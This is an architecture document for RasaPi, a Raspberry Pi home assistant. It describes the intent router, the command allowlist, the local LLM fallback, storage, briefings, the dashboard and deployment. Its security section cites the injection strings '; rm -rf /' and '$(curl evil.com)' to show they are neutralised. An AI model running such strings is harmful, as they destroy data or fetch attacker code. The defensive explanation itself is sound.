# RasaPi — Architecture

This document describes the architecture as it exists in code today (Phases 1–5 complete; Phase 6 in progress). Future phases will extend specific modules without changing existing interfaces.

---

## High-level system view

```
                  ┌────────────────────────────────────────────────────────────┐
                  │                   Raspberry Pi 5                            │
                  │                                                             │
  HTTP (LAN)      │  ┌──────────────────────────────────────────────────────┐  │
  ─────────────►  │  │               FastAPI Backend                        │  │
                  │  │  api/routes:  health  assistant  memory  tasks       │  │
                  │  │               briefing                               │  │
                  │  └─────────┬────────────────────────────────────────────┘  │
                  │            │                                                │
                  │   ┌────────▼─────────┐                                      │
                  │   │ config.py (.env) │                                      │
                  │   └──────────────────┘                                      │
                  │                                                             │
                  │  ┌──────────────────────────┐  ┌────────────────────────┐  │
                  │  │          core/           │  │     briefing/          │  │
                  │  │                          │  │     (Phase 4)          │  │
                  │  │  intent_router.py        │  │  sources.py            │  │
                  │  │  command_runner.py       │  │  rss_client.py ───────┐│  │
                  │  │  local_llm.py ──────┐    │  │  weather.py    ──────┐││  │
                  │  │  memory.py          │    │  │  generator.py        │││  │
                  │  │  tasks.py           │    │  │  formatter.py        │││  │
                  │  └─────────┬───────────┼────┘  └─────────────────────┬┴┴┘  │
                  │            │           │                             │     │
                  │            │     ┌─────▼──────┐                      │     │
                  │            │     │  Ollama    │                      │     │
                  │            │     │  :11434    │              ┌───────▼──┐  │
                  │            │     │  (local)   │              │ public   │  │
                  │            │     └────────────┘              │ RSS +    │  │
                  │            │                                 │ open-meteo│ │
                  │            ▼                                 └──────────┘  │
                  │  ┌──────────────────────┐                                   │
                  │  │     storage/         │ ◄── briefing also writes here     │
                  │  │  database.py         │                                   │
                  │  │  schema.py           │                                   │
                  │  │  → rasapi.db         │                                   │
                  │  └──────────────────────┘                                   │
                  │                                                             │
                  │  ┌──────────────────────────────────────────────────────┐  │
                  │  │                  security/                           │  │
                  │  │  allowlist.py  audit_log.py  sensitive_data.py       │  │
                  │  └──────────────────────────────────────────────────────┘  │
                  │                                                             │
                  └────────────────────────────────────────────────────────────┘
```

Important: the `briefing/` package does **not** import from `core/memory.py`, `core/tasks.py`, `core/command_runner.py`, or `subprocess`. A structural test enforces this, so personal user data cannot leak into a briefing context.

The whole stack is one Python process. No daemons, no message queue, no DB in Phase 1 — JSONL on disk is the only persistence layer.

---

## Request flow — `POST /ask`

```
  Client
    │
    │  POST /ask  {"query": "..."}
    ▼
  api/routes/assistant.py
    │  validate body (Pydantic: 1 ≤ len(query) ≤ 2000)
    │  generate request_id (uuid4)
    │  audit_logger.log_request(request_id, query)
    ▼
  core/intent_router.route(query, request_id)              ◄─ unchanged in P2
    │
    │  for each Intent in INTENTS:
    │      keyword match → handler() or run_command(cmd, args)
    │  no match          → RouteResult(intent="fallback")
    │
    ├─── matched ─────────────────────────────────────────────────────────┐
    │                                                                      │
    │   core/command_runner.run_command(request_id, cmd, args)             │
    │     ├─ AllowlistValidator.validate(CommandRequest)                   │
    │     │     └─ ValidationError → audit (rejected) → "Command rejected" │
    │     └─ subprocess.run([cmd,*args], shell=False, timeout=10)          │
    │           └─ audit (allowed/error, duration_ms)                      │
    │                                                                      │
    └─── intent == "fallback" ────────────────────────────────────────────►│
                                                                           │
                          ┌─ enable_local_llm == False ───┐                │
                          │   return Phase 1 fallback msg │                │
                          └────────────────────┬──────────┘                │
                                               │                           │
                          ┌─ enable_local_llm == True ────┐                │
                          │ core/local_llm.generate_chat_response(query)  │
                          │   httpx POST → Ollama /api/chat               │
                          │   timeout = LOCAL_LLM_TIMEOUT_SECONDS         │
                          │                                                │
                          │ ┌─ 200 OK ─┐                                   │
                          │ │ audit (success) → text → intent="llm_fallback"
                          │ └──────────┘                                   │
                          │ ┌─ Timeout / ConnectError / 5xx ┐              │
                          │ │ audit (error) → safe message  │              │
                          │ │ → intent="llm_unavailable"    │              │
                          │ └───────────────────────────────┘              │
                          └─────────────────────┬──────────────────────────┘
                                                ▼
  api/routes/assistant.py
    │  build AskResponse(request_id, intent, response, source, duration_ms)
    ▼
  Client  ◄── 200 OK with JSON
```

Every step has an audit hook. Every executable path is gated. The LLM branch returns plain text; **there is no path from the LLM response back to the command runner or to the memory store**.

### Phase 3 — memory / notes / tasks branches

When the router matches one of `save_memory`, `list_memory`, `save_note`, `list_notes`, `add_task`, `list_tasks`, or `complete_task`, dispatch goes to a handler in `core/memory.py` or `core/tasks.py`:

```
   matched memory/task intent
            │
            ▼
   core/memory.py  (or core/tasks.py)
            │
            │  1. (writes only) sensitive_data.is_sensitive(value)
            │       → blocked: audit (sensitive_memory_blocked) → reject
            │
            │  2. parameterized SQL via storage.database.db_session()
            │       → INSERT / SELECT / UPDATE on backend/data/rasapi.db
            │
            │  3. audit_logger.log_storage_event(event_type, item_type, item_id)
            │
            ▼
   formatted text returned to assistant route
            │
            ▼
   client receives JSON
```

Direct REST endpoints (`POST /memory`, `POST /tasks`, …) skip the router and call the same service functions directly. The sensitive-data check and audit log fire in both surfaces because they live in the service layer.

### Phase 4 — daily briefing branch

When the router matches one of the briefing intents (`daily_briefing`, `world_briefing`, `ai_briefing`, `tech_briefing`, `developer_briefing`, `weather_briefing`, `immigration_briefing`), dispatch goes to a handler in `briefing/generator.py`:

```
   matched briefing intent
            │
            ▼
   briefing/generator.py
            │
            │  1. cache check: SELECT FROM briefing_runs
            │       WHERE created_at > now - BRIEFING_CACHE_MINUTES
            │
            ├── cache HIT → SELECT FROM briefing_items
            │
            └── cache MISS → for source in SOURCES:
                  │     try fetch (rss_client.fetch_rss_items
                  │                 OR weather.fetch_weather)
                  │     ├── on success: dedupe + INSERT briefing_items
                  │     │              + audit (briefing_item_stored)
                  │     └── on failure: audit (briefing_source_failed)
                  │                     continue with next source
                  └── INSERT briefing_runs (status=success|partial)
                       + audit (briefing_refresh_completed)
            │
            ▼
   briefing/formatter.format_daily_briefing(items_by_category)
            │
            │  if both LLM flags true:
            │      headlines (titles + source names ONLY) → local_llm.generate_briefing_summary
            │      audit (llm_briefing_summary_used)
            │  else:
            │      deterministic header-per-category formatting
            │
            │  if items contain immigration_updates:
            │      append IMMIGRATION_DISCLAIMER
            │
            ▼
   formatted text returned to assistant route
```

REST endpoints (`/briefing/refresh`, `/briefing/daily`, `/briefing/category/{c}`, `/briefing/sources`) hit the same service functions directly.

### Phase 6 — Deployment topology

Phase 6 introduces a deployment story but does not change the application:

```
   ┌──────────────────┐  git push   ┌────────────────────────┐
   │  MacBook (dev)   │ ──────────► │  GitHub                │
   └──────────────────┘             │  rasapi-local-ai-…     │
                                    └──────────┬─────────────┘
                                               │ git clone
                                               ▼
   ┌─────────────────────────────────────────────────────────┐
   │           Raspberry Pi 5 (Bookworm 64-bit)              │
   │                                                         │
   │   bash deployment/raspberry-pi/install.sh               │
   │     → backend/.venv                                     │
   │     → pip install -r backend/requirements.txt           │
   │     → backend/data/  (mode 700)                         │
   │     → logs/          (mode 700)                         │
   │     → .env           (operator: chmod 600, never        │
   │                       overwritten by install.sh)        │
   │                                                         │
   │   /etc/systemd/system/rasapi.service                    │
   │     User=<PI_USER>   (NOT root)                         │
   │     ExecStart=…/uvicorn main:app                         │
   │       default: --host 127.0.0.1 (Pi-local only)         │
   │       alt:     --host 0.0.0.0   (LAN, with warning)     │
   │     Restart=on-failure                                  │
   │     NoNewPrivileges, PrivateTmp, ProtectSystem=full     │
   └────────────────────────┬────────────────────────────────┘
                            │ http (LAN, no public port-forward)
                            ▼
                       MacBook browser
                       http://<pi-ip>:8000/dashboard
```

The application binary, the SQLite store, and the audit log all live on
the Pi. There is no inbound dependency on a network service beyond the
public RSS hosts and Open-Meteo (Phase 4). The Pi can run for weeks
unattended; the systemd service auto-restarts on failure and survives
reboots.

The briefing package's outbound network calls go to:
- the public RSS hosts in `briefing/sources.py` (BBC, NPR, Hugging Face, Google AI Blog, Ars Technica, The Verge, Hacker News mirror, USCIS)
- `api.open-meteo.com` for weather (no API key)

No other hosts are contacted.

### Phase 5 — Dashboard branch

Browser-driven, server-rendered, read-mostly:

```
   Browser  ──►  GET /dashboard
                   │
                   ▼
   api/routes/dashboard.py
                   │
                   │  audit_logger.log_dashboard_event(dashboard_viewed)
                   ▼
   dashboard/service.build_view_model()
                   │
                   ├── settings (projected SAFE subset)
                   ├── stdlib: shutil.disk_usage, platform.*, os.getloadavg
                   ├── intent_router.list_intents() (grouped by phase)
                   ├── direct SQL on memory_items / notes / tasks / briefing_*
                   │   (bypasses memory/tasks list functions to avoid extra
                   │    audit events on read)
                   ├── briefing_runs SELECT for last-refresh metadata
                   └── security.audit_reader.read_recent / read_security_events
                       (JSONL parser, skips malformed lines)
                   │
                   ▼
   Jinja2Templates (autoescape ON)
                   │
                   ▼
   HTML response (links static/dashboard.css)
```

Two write paths exist:

- `POST /dashboard/briefing/refresh` → calls existing `briefing.refresh_briefing` then 303 redirects to `/dashboard`
- `POST /dashboard/tasks/{id}/complete` → calls existing `tasks.complete_task` then 303 redirects

Both reuse the existing audited service functions. The dashboard adds a `dashboard_*_requested/completed` audit event in addition to the underlying `task_completed` / `briefing_*` events.

---

## Intent router flow

The router is intentionally *not* an LLM. It is a deterministic pipeline that keeps Phase 1's behaviour fully predictable, fully auditable, and fully testable without a model on disk.

```
   query: "How much disk space do I have?"
            │
            │  query.lower().strip()  →  "how much disk space do i have?"
            ▼
   ┌──────────────────────────────────────────────────────────────┐
   │  for intent in INTENTS:                                      │
   │      if any(keyword in query for keyword in intent.keywords):│
   │          MATCH                                               │
   ├──────────────────────────────────────────────────────────────┤
   │                                                              │
   │  greeting   → keywords ("hello","hi ","hey","good morning")  │
   │  help       → ("help","what can you do","commands")          │
   │  time       → ("time","date","what day")                     │
   │  uptime     → ("uptime","how long","been running")           │
   │  cpu_temp   → ("temperature","cpu temp","how hot")           │
   │  disk       → ("disk","storage","space left","free space")  ◄── matches "disk"
   │  memory     → ("memory","ram","free memory")                 │
   │  hostname   → ("hostname","device name")                     │
   │  system     → ("system info","kernel","os version","uname")  │
   │                                                              │
   └──────────────────────────────────────────────┬───────────────┘
                                                  │
                                                  ▼
                          ┌──────────────────────────────────────┐
                          │   intent.handler  OR  intent.command │
                          │                                      │
                          │   greeting / help → handler()         │
                          │   everything else → run_command()    │
                          └──────────────────────────────────────┘

   no match  →  RouteResult(intent="fallback", response="Phase 2 will handle free-form…")
```

**Why keyword-based for Phase 1:**

- Fully deterministic — same input always produces same output
- Auditable in code review (one file, one tuple of intents)
- No model weights, no inference time, no Ollama dependency
- Lets the security model be validated *before* an LLM is in the loop

### Phase 2 LLM fallback — what changed and what didn't

**Did not change:**
- The router runs first on every request.
- If the router matches an intent, the command path is identical to Phase 1.
- The allowlist and `subprocess(shell=False)` layers are untouched.

**Added:**
- A new module `core/local_llm.py` with one function: `generate_chat_response(query: str) -> str`.
- The route handler calls it **only** when the router returned `fallback` AND `ENABLE_LOCAL_LLM=true`.
- The function returns a plain string. There is no overload that returns a "tool call" or structured action.

The LLM does not propose intents that might be executed. It produces conversational text and that's it. If a future phase adds LLM-proposed intent classification, the router and allowlist will still own dispatch — the LLM will never be a direct executor.

---

## Command execution — three safety layers

Every successful command exec passes **three independent gates**. Defeating one gate is not enough; an attacker would need to defeat all three simultaneously.

```
   ┌────────────────────────────────────────────────────────────────────┐
   │  LAYER 1 — Intent Router                                           │
   │  ────────────────────────                                          │
   │  Only queries matching a hard-coded keyword set reach an executor. │
   │  Anything else → fallback. Default deny at the language level.     │
   └─────────────────────────────┬──────────────────────────────────────┘
                                 │   matched: cmd="df", args=["-h"]
                                 ▼
   ┌────────────────────────────────────────────────────────────────────┐
   │  LAYER 2 — Allowlist Validator                                     │
   │  ─────────────────────────────                                     │
   │  ALLOWED_COMMANDS = {                                              │
   │      "uptime":   max_args=0                                        │
   │      "date":     max_args=0                                        │
   │      "uname":    max_args=1, allowed_args=["-a","-r","-m","-s"]    │
   │      "df":       max_args=1, allowed_args=["-h"]                   │
   │      "free":     max_args=1, allowed_args=["-h","-m"]              │
   │      "vcgencmd": max_args=1, allowed_args=["measure_temp",…]       │
   │      "ip":       max_args=1, allowed_args=["addr"]                 │
   │      "hostname": max_args=0                                        │
   │  }                                                                 │
   │                                                                    │
   │  Rejects:                                                          │
   │   - command not in dict                  → ValidationError         │
   │   - too many args                        → ValidationError         │
   │   - arg not in spec.allowed_args         → ValidationError         │
   └─────────────────────────────┬──────────────────────────────────────┘
                                 │  validated
                                 ▼
   ┌────────────────────────────────────────────────────────────────────┐
   │  LAYER 3 — subprocess with shell=False                             │
   │  ─────────────────────────────────────                             │
   │  subprocess.run(                                                   │
   │      [cmd, *args],   ← Python list, NOT a string                   │
   │      shell=False,    ← no /bin/sh involvement                      │
   │      timeout=10,     ← caps runaway processes                      │
   │      capture_output=True, text=True                                │
   │  )                                                                 │
   │                                                                    │
   │  Because args are a list and no shell is invoked:                  │
   │   - "; rm -rf /" inside an arg becomes a literal arg, not a chain  │
   │   - "$(curl evil.com)" is never expanded                           │
   │   - globs, redirects, pipes are inert                              │
   └────────────────────────────────────────────────────────────────────┘
```

If any layer rejects, the audit log records `outcome="rejected"` (or `"error"`) with the reason, and the user gets a polite error string — never a stack trace.

---

## Module responsibilities

| Module | Responsibility | Depends on |
|---|---|---|
| `backend/main.py` | App factory, lifespan, router registration | config, routes |
| `backend/config.py` | Type-safe settings from `.env` | pydantic-settings |
| `api/routes/health.py` | `GET /health` — liveness, version | config |
| `api/routes/assistant.py` | `POST /ask`, `GET /commands`, LLM fallback dispatch | intent_router, local_llm, audit_log |
| `api/routes/memory.py` | `POST/GET /memory`, `POST/GET /notes` | core/memory |
| `api/routes/tasks.py` | `POST/GET /tasks`, `PATCH /tasks/{id}/complete` | core/tasks |
| `core/intent_router.py` | Keyword matching, intent dispatch | command_runner, memory, tasks |
| `core/command_runner.py` | Validated subprocess execution | allowlist, audit_log |
| `core/local_llm.py` | Ollama HTTP client; conversational text only | config, httpx |
| `core/memory.py` | Memory + notes service (SQLite I/O, sensitive-data check) | storage, security/sensitive_data, audit_log |
| `core/tasks.py` | Tasks service (CRUD on `tasks` table) | storage, audit_log |
| `storage/database.py` | `db_session()` context manager, `init_db()` | config, schema |
| `storage/schema.py` | `CREATE TABLE` statements | — |
| `security/sensitive_data.py` | Regex + keyword detector for secrets | — |
| `api/routes/briefing.py` | `GET /briefing[/daily]`, `GET /briefing/category/{c}`, `POST /briefing/refresh`, `GET /briefing/sources` | briefing.* |
| `briefing/sources.py` | Hardcoded `Source` registry + `CATEGORIES` constants | — |
| `briefing/rss_client.py` | httpx + feedparser fetcher; raises `SourceFetchError` on network/HTTP issues | config |
| `briefing/weather.py` | Open-Meteo client (no API key); returns dict or None | config |
| `briefing/generator.py` | refresh, dedup, cache check, dispatch, optional LLM summary | briefing.*, storage, audit_log, core/local_llm |
| `briefing/formatter.py` | Daily and category text rendering; immigration disclaimer | — |
| `api/routes/dashboard.py` | `GET /dashboard` (HTML), `GET /dashboard/health\|/audit/recent\|/security-events` (JSON), `POST /dashboard/briefing/refresh\|/tasks/{id}/complete` | dashboard.service, briefing, tasks, audit_log |
| `dashboard/service.py` | View-model aggregator; reads DB directly to avoid extra audit events | settings, intent_router, storage, briefing, audit_reader |
| `security/audit_reader.py` | Read-only JSONL parser; skips malformed lines; truncates long fields | config |
| `templates/dashboard.html` | Single Jinja2 template with autoescape on | — |
| `static/dashboard.css` | Local CSS, no CDN, no remote fonts | — |
| `deployment/raspberry-pi/install.sh` | Idempotent Pi bootstrap. Aborts safely if system packages missing. | — |
| `deployment/raspberry-pi/rasapi.service` | systemd unit. Non-root, default `127.0.0.1`, commented LAN-binding alternative. | — |
| `deployment/raspberry-pi/smoke-test.sh` | 9-endpoint smoke check. `BASE_URL` configurable. | curl |
| `deployment/raspberry-pi/backup.sh` / `restore.sh` | Local DB + audit-log snapshot/restore. Excludes `.env`. | — |
| `security/allowlist.py` | Default-deny command whitelist | — |
| `security/audit_log.py` | Append-only JSONL event sink | config |

---

## Technology choices

| Component | Choice | Reason |
|---|---|---|
| Web framework | FastAPI | Async, typed, auto-docs, Pi-compatible |
| Config | pydantic-settings | Type-safe `.env` loading |
| Local LLM (Phase 2) | Ollama | Best Pi 5 support, easy model swap |
| Test framework | pytest + httpx TestClient | Standard, async-aware |
| Audit format | JSONL | Streamable, grep-friendly, no DB needed |
| Process manager (deploy) | systemd (Phase 5) | Native, no extra deps on Pi |

---

## Phase 2+ extension points

Each module exposes a stable interface so later phases can plug in without disturbing what already works.

| Module | Phase 2+ extension |
|---|---|
| `core/local_llm.py` | Swap Ollama for another local provider (e.g. llama.cpp HTTP) without changing the function signature |
| `core/intent_router.py` | Add new intents to the `INTENTS` tuple; no logic change required |
| `security/allowlist.py` | Move whitelist to a YAML file loaded at startup |
| `security/audit_log.py` | Add a remote sink (syslog, Loki) alongside JSONL |
| `api/routes/` | Drop in `voice.py` (Phase 4), `reminders.py` (Phase 3) without touching existing routes |
